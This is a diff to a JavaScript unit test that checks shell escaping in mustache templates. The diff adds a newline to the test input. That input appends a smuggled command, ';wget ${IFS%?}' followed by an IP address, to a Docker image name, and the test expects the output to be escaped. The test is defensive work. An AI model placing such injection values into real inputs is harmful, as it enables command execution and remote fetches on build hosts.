@@ -20,11 +20,11 @@ const mustache = require('mustache');
 
 describe('Shell escaping in template', () => {
   it('should escape unsafe shell characters', () => {
-    const input = 'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel-ubuntu16.04;wget ${IFS%?}172.23.232.125:3000';
+    const input = 'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel\n-ubuntu16.04;wget ${IFS%?}172.23.232.125:3000';
     const actualOutput = mustache.render('{{ input }}\n{{{ input }}}', {input});
     const expectedOutput = [
-      'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel-ubuntu16.04\\;wget\\ \\$\\{IFS%\\?\\}172.23.232.125:3000',
-      'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel-ubuntu16.04;wget ${IFS%?}172.23.232.125:3000',
+      'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel\\n-ubuntu16.04\\;wget\\ \\$\\{IFS%\\?\\}172.23.232.125:3000',
+      'pai.build.base:hadoop2.7.2-cuda8.0-cudnn6-devel\n-ubuntu16.04;wget ${IFS%?}172.23.232.125:3000',
     ].join('\n');
     assert.strictEqual(actualOutput, expectedOutput);
   });
